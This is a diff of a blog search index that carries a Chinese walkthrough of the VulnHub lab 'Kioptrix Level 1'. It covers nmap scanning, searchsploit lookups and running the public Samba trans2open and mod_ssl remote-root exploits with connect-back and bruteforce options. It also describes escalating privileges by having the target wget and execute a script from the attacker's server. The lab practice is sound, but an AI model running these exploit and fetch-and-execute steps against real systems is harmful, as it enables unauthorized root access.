-  <entry>
-    <title>Kioptrix Level 1</title>
-    <url>/2024/01/29/Kioptrix_Level_1/</url>
-    <content><![CDATA[<h1 id="kioptrix-level-1"><a class="markdownIt-Anchor" href="#kioptrix-level-1"></a> Kioptrix Level 1</h1>
-<blockquote>
-<p>参考 <a href="https://www.cnblogs.com/jarwu/p/17240815.html">Walkthrough-KIOPTRIX LEVEL1 - Jarwu - 博客园 (cnblogs.com)</a></p>
-</blockquote>
-<h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2>
-<h3 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h3>
-<ul>
-<li>nmap扫描附近存活主机ip</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sn xxxx </span><br></pre></td></tr></table></figure>
-<p><strong>拿到目标ip为<code>192.168.89.132</code></strong></p>
-<ul>
-<li>nmap扫描端口</li>
-</ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo nmap -sV -p- -T4 xxxx</span><br></pre></td></tr></table></figure>
-<p>-sV 列举出端口使用协议或服务的版本信息</p>
-<p>-p- 扫描全端口</p>
-<p>-T4 设置线程数 <code>加快扫描速度</code></p>
-<p><strong>开放端口信息：</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-29 08:00 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.132)</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Not shown: 65529 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: XMYGROUP)</span><br><span class="line">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:A6:90:BB (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 24.09 seconds</span><br></pre></td></tr></table></figure>
-<h3 id="思路1samba-139端口"><a class="markdownIt-Anchor" href="#思路1samba-139端口"></a> 思路1——Samba 139端口</h3>
-<h4 id="查询samba版本"><a class="markdownIt-Anchor" href="#查询samba版本"></a> 查询Samba版本</h4>
-<ul>
-<li>
-<p>三种工具：<code>enum4linux</code>、<code>smbclient</code>、<code>metasploit</code></p>
-<ul>
-<li>smbclient -L=<ip></ip></li>
-</ul>
-</li>
-<li>
-<p>这里使用metasploit的Auxiliary模块</p>
-</li>
-</ul>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.19.41.png" alt="截屏2024-01-29_下午9.19.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<ul>
-<li>设置RHOSTS <strong>得到smb版本：2.2.1a</strong></li>
-</ul>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.21.32-9034244.png" alt="截屏2024-01-29_下午9.21.32" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><mark>注意：oscp中不允许使用msf，这里仅供学习</mark></p>
-<h4 id="寻找exploit"><a class="markdownIt-Anchor" href="#寻找exploit"></a> 寻找exploit</h4>
-<ul>
-<li>工具：<code>searchsploit</code></li>
-<li>用searchsploit 查找：<code>searchsploit Samba 2.2.1a</code></li>
-</ul>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.29.16-9034252.png" alt="截屏2024-01-29_下午9.29.16" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>发现存在trans2open Overflow的漏洞</strong></p>
-<ul>
-<li>
-<p>在github中找到了脚本：<a href="https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c">https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c</a></p>
-</li>
-<li>
-<p>事实证明，searchsploit里面自己存的multiple/remote/10.c 脚本也可以用，需要使用命令：<code>searchsploit -m multiple/remote/10.c</code>，复制到当前目录</p>
-</li>
-</ul>
-<h4 id="编译和运行脚本"><a class="markdownIt-Anchor" href="#编译和运行脚本"></a> 编译和运行脚本</h4>
-<h5 id="github脚本"><a class="markdownIt-Anchor" href="#github脚本"></a> github脚本</h5>
-<ul>
-<li>
-<p>编译：<code>gcc trans2open.c -o trans2open </code></p>
-</li>
-<li>
-<p>运行：<code>./trans2open</code></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Samba &lt; 2.2.8 Remote Root exploit by Schizoprenic</span><br><span class="line">Connect back method, Xnuxer-Labs, 2003.</span><br><span class="line">Usage  : ./trans2open &lt;type&gt; &lt;victim&gt; &lt;your_ip&gt;</span><br><span class="line">Targets:</span><br><span class="line">         0 = Linux</span><br><span class="line">         1 = FreeBSD/NetBSD</span><br><span class="line">         2 = OpenBSD 3.0 and prior</span><br><span class="line">         3 = OpenBSD 3.2 - non-exec stack</span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>根据提示：<code>./trans2open 0 192.168.89.132 192.168.89.137 </code></p>
-</li>
-</ul>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.34.28-9034261.png" alt="截屏2024-01-29_下午9.34.28" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h5 id="searchsploit自带脚本"><a class="markdownIt-Anchor" href="#searchsploit自带脚本"></a> searchsploit自带脚本</h5>
-<ul>
-<li>
-<p>编译</p>
-</li>
-<li>
-<p>运行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)                                                                  </span><br><span class="line">--------------------------------------------------------------                                                                  </span><br><span class="line">Usage: ./10 [-bBcCdfprsStv] [host]                                                                                              </span><br><span class="line">                                                                                                                                </span><br><span class="line">-b    bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)                          </span><br><span class="line">-B        bruteforce steps (default = 300)                                                                                </span><br><span class="line">-c  connectback ip address                                                                                          </span><br><span class="line">-C  max childs for scan/bruteforce mode (default = 40)                                                              </span><br><span class="line">-d       bruteforce/scanmode delay in micro seconds (default = 100000)                                                   </span><br><span class="line">-f              force                                                                                                           </span><br><span class="line">-p        port to attack (default = 139)                                                                                  </span><br><span class="line">-r         return address                                                                                                  </span><br><span class="line">-s              scan mode (random)                                                                                              </span><br><span class="line">-S     scan mode                                                                                                       </span><br><span class="line">-t        presets (0 for a list)                                                                                          </span><br><span class="line">-v              verbose mode     </span><br></pre></td></tr></table></figure>
-</li>
-<li>
-<p>根据提示：<code>./10 -b 0 192.168.89.132</code></p>
-</li>
-</ul>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8810.29.37.png" alt="截屏2024-01-29_下午10.29.37" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<h3 id="思路2-mod_ssl284-端口443"><a class="markdownIt-Anchor" href="#思路2-mod_ssl284-端口443"></a> 思路2 ——mod_ssl/2.8.4 端口443</h3>
-<h4 id="版本信息"><a class="markdownIt-Anchor" href="#版本信息"></a> 版本信息</h4>
-<p>这里nmap把版本写的很清楚：443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</p>
-<h4 id="寻找exploit-2"><a class="markdownIt-Anchor" href="#寻找exploit-2"></a> 寻找exploit</h4>
-<ul>
-<li><code>searchsploit mod_ssl 2.8.4</code></li>
-</ul>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.33.13.png" alt="截屏2024-01-29_下午11.33.13" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>挑选一个数值更大的文件：47080.c</strong></p>
-<ul>
-<li><code>searchsploit -x unix/remote/47080.c</code></li>
-</ul>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.35.09.png" alt="截屏2024-01-29_下午11.35.09" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p><strong>仔细看注释，里面写了requirements和编译命令</strong></p>
-<h4 id="编译和运行脚本-2"><a class="markdownIt-Anchor" href="#编译和运行脚本-2"></a> 编译和运行脚本</h4>
-<p>这个步骤其实就是根据提示补全命令，运行脚本后，可以直接拿到root（理论上）。</p>
-<p>事实上，我尝试了很久，大概在七八次的时候才拿到root（碰运气）</p>
-<p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.29.06.png" alt="截屏2024-01-29_下午11.29.06" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p>
-<p>在此之前都是拿到一个普通用户apache的权限，因此，我学习了一些提权知识，详见<code>学习总结——关于Linux提权</code>。</p>
-<h2 id="学习总结"><a class="markdownIt-Anchor" href="#学习总结"></a> 学习总结</h2>
-<h3 id="关于samba"><a class="markdownIt-Anchor" href="#关于samba"></a> 关于Samba</h3>
-<p>Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一个免费软件，由服务器及客户端程序构成。Samba 是能够在任何支持 SMB 协议的主机之间共享文件的一种实现，当然也包括 windows。SMB 是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。SMB 协议是 C/S 型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。</p>
-<h3 id="关于msf的auxiliary"><a class="markdownIt-Anchor" href="#关于msf的auxiliary"></a> 关于MSF的Auxiliary</h3>
-<p>auxiliary 本身意思为辅助的</p>
-<p>在msf中代表辅助探测模块：该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。</p>
-<p><strong>本次渗透测试用于查询smb服务版本</strong></p>
-<h3 id="关于linux-提权部分"><a class="markdownIt-Anchor" href="#关于linux-提权部分"></a> 关于Linux 提权（部分）</h3>
-<p>此处是因为一点小bug，脚本在运行的时候wget不稳定，导致提权脚本没拉到本地，因此没有成功，只有一个普通用户的权限。</p>
-<p>在遇到这个问题的时候，我顺便学习了一点提权知识：</p>
-<ul>
-<li>利用linux内核版本信息（uname -a在靶机上查看），然后在攻击机上搜索exploit</li>
-<li>通过爆破脚本，暴力破解root密码</li>
-</ul>
-<p>但提权过程基本是：<strong>寻找exploit或相关脚本，通过在攻击机上开启apache服务，将脚本上传到/var/www/html之中，然后靶机通过wget <a href="http://xn--ip-6c5c234ebjc/%E7%9B%AE%E6%A0%87%E8%84%9A%E6%9C%AC">http://攻击机ip/目标脚本</a> 拿到本地执行</strong></p>
-]]></content>
+      
+      
+        <tags>
+            
+            <tag> vulnhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
+      <title>Kioptrix Level 1</title>
+      <link href="/2024/01/29/Kioptrix_Level_1/"/>
+      <url>/2024/01/29/Kioptrix_Level_1/</url>
+      
+        <content type="html"><![CDATA[<h1 id="kioptrix-level-1"><a class="markdownIt-Anchor" href="#kioptrix-level-1"></a> Kioptrix Level 1</h1><blockquote><p>参考 <a href="https://www.cnblogs.com/jarwu/p/17240815.html">Walkthrough-KIOPTRIX LEVEL1 - Jarwu - 博客园 (cnblogs.com)</a></p></blockquote><h2 id="渗透思路"><a class="markdownIt-Anchor" href="#渗透思路"></a> 渗透思路</h2><h3 id="信息收集"><a class="markdownIt-Anchor" href="#信息收集"></a> 信息收集</h3><ul><li>nmap扫描附近存活主机ip</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sn xxxx </span><br></pre></td></tr></table></figure><p><strong>拿到目标ip为<code>192.168.89.132</code></strong></p><ul><li>nmap扫描端口</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nmap -sV -p- -T4 xxxx</span><br></pre></td></tr></table></figure><p>-sV 列举出端口使用协议或服务的版本信息</p><p>-p- 扫描全端口</p><p>-T4 设置线程数 <code>加快扫描速度</code></p><p><strong>开放端口信息：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-01-29 08:00 EST</span><br><span class="line">Nmap scan report for localhost (192.168.89.132)</span><br><span class="line">Host is up (0.0021s latency).</span><br><span class="line">Not shown: 65529 closed tcp ports (reset)</span><br><span class="line">PORT     STATE SERVICE     VERSION</span><br><span class="line">22/tcp   open  ssh         OpenSSH 2.9p2 (protocol 1.99)</span><br><span class="line">80/tcp   open  http        Apache httpd 1.3.20 ((Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b)</span><br><span class="line">111/tcp  open  rpcbind     2 (RPC #100000)</span><br><span class="line">139/tcp  open  netbios-ssn Samba smbd (workgroup: XMYGROUP)</span><br><span class="line">443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</span><br><span class="line">1024/tcp open  status      1 (RPC #100024)</span><br><span class="line">MAC Address: 00:0C:29:A6:90:BB (VMware)</span><br><span class="line"></span><br><span class="line">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 24.09 seconds</span><br></pre></td></tr></table></figure><h3 id="思路1samba-139端口"><a class="markdownIt-Anchor" href="#思路1samba-139端口"></a> 思路1——Samba 139端口</h3><h4 id="查询samba版本"><a class="markdownIt-Anchor" href="#查询samba版本"></a> 查询Samba版本</h4><ul><li><p>三种工具：<code>enum4linux</code>、<code>smbclient</code>、<code>metasploit</code></p><ul><li>smbclient -L=<ip></ip></li></ul></li><li><p>这里使用metasploit的Auxiliary模块</p></li></ul><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.19.41.png" alt="截屏2024-01-29_下午9.19.41" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><ul><li>设置RHOSTS <strong>得到smb版本：2.2.1a</strong></li></ul><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.21.32-9034244.png" alt="截屏2024-01-29_下午9.21.32" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><mark>注意：oscp中不允许使用msf，这里仅供学习</mark></p><h4 id="寻找exploit"><a class="markdownIt-Anchor" href="#寻找exploit"></a> 寻找exploit</h4><ul><li>工具：<code>searchsploit</code></li><li>用searchsploit 查找：<code>searchsploit Samba 2.2.1a</code></li></ul><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.29.16-9034252.png" alt="截屏2024-01-29_下午9.29.16" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>发现存在trans2open Overflow的漏洞</strong></p><ul><li><p>在github中找到了脚本：<a href="https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c">https://github.com/KernelPan1k/trans2open-CVE-2003-0201/blob/master/trans2open.c</a></p></li><li><p>事实证明，searchsploit里面自己存的multiple/remote/10.c 脚本也可以用，需要使用命令：<code>searchsploit -m multiple/remote/10.c</code>，复制到当前目录</p></li></ul><h4 id="编译和运行脚本"><a class="markdownIt-Anchor" href="#编译和运行脚本"></a> 编译和运行脚本</h4><h5 id="github脚本"><a class="markdownIt-Anchor" href="#github脚本"></a> github脚本</h5><ul><li><p>编译：<code>gcc trans2open.c -o trans2open </code></p></li><li><p>运行：<code>./trans2open</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Samba &lt; 2.2.8 Remote Root exploit by Schizoprenic</span><br><span class="line">Connect back method, Xnuxer-Labs, 2003.</span><br><span class="line">Usage  : ./trans2open &lt;type&gt; &lt;victim&gt; &lt;your_ip&gt;</span><br><span class="line">Targets:</span><br><span class="line">         0 = Linux</span><br><span class="line">         1 = FreeBSD/NetBSD</span><br><span class="line">         2 = OpenBSD 3.0 and prior</span><br><span class="line">         3 = OpenBSD 3.2 - non-exec stack</span><br></pre></td></tr></table></figure></li><li><p>根据提示：<code>./trans2open 0 192.168.89.132 192.168.89.137 </code></p></li></ul><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%889.34.28-9034261.png" alt="截屏2024-01-29_下午9.34.28" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h5 id="searchsploit自带脚本"><a class="markdownIt-Anchor" href="#searchsploit自带脚本"></a> searchsploit自带脚本</h5><ul><li><p>编译</p></li><li><p>运行</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">samba-2.2.8 &lt; remote root exploit by eSDee (www.netric.org|be)                                                                  </span><br><span class="line">--------------------------------------------------------------                                                                  </span><br><span class="line">Usage: ./10 [-bBcCdfprsStv] [host]                                                                                              </span><br><span class="line">                                                                                                                                </span><br><span class="line">-b    bruteforce (0 = Linux, 1 = FreeBSD/NetBSD, 2 = OpenBSD 3.1 and prior, 3 = OpenBSD 3.2)                          </span><br><span class="line">-B        bruteforce steps (default = 300)                                                                                </span><br><span class="line">-c  connectback ip address                                                                                          </span><br><span class="line">-C  max childs for scan/bruteforce mode (default = 40)                                                              </span><br><span class="line">-d       bruteforce/scanmode delay in micro seconds (default = 100000)                                                   </span><br><span class="line">-f              force                                                                                                           </span><br><span class="line">-p        port to attack (default = 139)                                                                                  </span><br><span class="line">-r         return address                                                                                                  </span><br><span class="line">-s              scan mode (random)                                                                                              </span><br><span class="line">-S     scan mode                                                                                                       </span><br><span class="line">-t        presets (0 for a list)                                                                                          </span><br><span class="line">-v              verbose mode     </span><br></pre></td></tr></table></figure></li><li><p>根据提示：<code>./10 -b 0 192.168.89.132</code></p></li></ul><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8810.29.37.png" alt="截屏2024-01-29_下午10.29.37" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><h3 id="思路2-mod_ssl284-端口443"><a class="markdownIt-Anchor" href="#思路2-mod_ssl284-端口443"></a> 思路2 ——mod_ssl/2.8.4 端口443</h3><h4 id="版本信息"><a class="markdownIt-Anchor" href="#版本信息"></a> 版本信息</h4><p>这里nmap把版本写的很清楚：443/tcp  open  ssl/https   Apache/1.3.20 (Unix)  (Red-Hat/Linux) mod_ssl/2.8.4 OpenSSL/0.9.6b</p><h4 id="寻找exploit-2"><a class="markdownIt-Anchor" href="#寻找exploit-2"></a> 寻找exploit</h4><ul><li><code>searchsploit mod_ssl 2.8.4</code></li></ul><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.33.13.png" alt="截屏2024-01-29_下午11.33.13" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>挑选一个数值更大的文件：47080.c</strong></p><ul><li><code>searchsploit -x unix/remote/47080.c</code></li></ul><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.35.09.png" alt="截屏2024-01-29_下午11.35.09" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p><strong>仔细看注释，里面写了requirements和编译命令</strong></p><h4 id="编译和运行脚本-2"><a class="markdownIt-Anchor" href="#编译和运行脚本-2"></a> 编译和运行脚本</h4><p>这个步骤其实就是根据提示补全命令，运行脚本后，可以直接拿到root（理论上）。</p><p>事实上，我尝试了很久，大概在七八次的时候才拿到root（碰运气）</p><p><img src="/2024/01/29/Kioptrix_Level_1/%E6%88%AA%E5%B1%8F2024-01-29_%E4%B8%8B%E5%8D%8811.29.06.png" alt="截屏2024-01-29_下午11.29.06" loading="lazy" onerror='this.onerror=null;this.src="/img/404.jpg"'></p><p>在此之前都是拿到一个普通用户apache的权限，因此，我学习了一些提权知识，详见<code>学习总结——关于Linux提权</code>。</p><h2 id="学习总结"><a class="markdownIt-Anchor" href="#学习总结"></a> 学习总结</h2><h3 id="关于samba"><a class="markdownIt-Anchor" href="#关于samba"></a> 关于Samba</h3><p>Samba 是在 Linux 和 UNIX 系统上实现 SMB 协议的一个免费软件，由服务器及客户端程序构成。Samba 是能够在任何支持 SMB 协议的主机之间共享文件的一种实现，当然也包括 windows。SMB 是一种在局域网上共享文件和打印机的一种通信协议，它为局域网内的不同计算机之间提供文件及打印机等资源的共享服务。SMB 协议是 C/S 型协议，客户机通过该协议可以访问服务器上的共享文件系统、打印机及其他资源。</p><h3 id="关于msf的auxiliary"><a class="markdownIt-Anchor" href="#关于msf的auxiliary"></a> 关于MSF的Auxiliary</h3><p>auxiliary 本身意思为辅助的</p><p>在msf中代表辅助探测模块：该模块不会直接在攻击机和靶机之间建立访问，它们只负责执行扫描，嗅探，指纹识别等相关功能以辅助渗透测试。</p><p><strong>本次渗透测试用于查询smb服务版本</strong></p><h3 id="关于linux-提权部分"><a class="markdownIt-Anchor" href="#关于linux-提权部分"></a> 关于Linux 提权（部分）</h3><p>此处是因为一点小bug，脚本在运行的时候wget不稳定，导致提权脚本没拉到本地，因此没有成功，只有一个普通用户的权限。</p><p>在遇到这个问题的时候，我顺便学习了一点提权知识：</p><ul><li>利用linux内核版本信息（uname -a在靶机上查看），然后在攻击机上搜索exploit</li><li>通过爆破脚本，暴力破解root密码</li></ul><p>但提权过程基本是：<strong>寻找exploit或相关脚本，通过在攻击机上开启apache服务，将脚本上传到/var/www/html之中，然后靶机通过wget <a href="http://xn--ip-6c5c234ebjc/%E7%9B%AE%E6%A0%87%E8%84%9A%E6%9C%AC">http://攻击机ip/目标脚本</a> 拿到本地执行</strong></p>]]></content>
+      
+      
       <categories>
-        <category>类OSCP靶机练习</category>
+          
+          <category> 类OSCP靶机练习 </category>
+          
       </categories>
-      <tags>
-        <tag>vulnhub</tag>
-      </tags>
-  </entry>
+      
+      
+        <tags>
+            
+            <tag> vulnhub </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+  
+  
 </search>
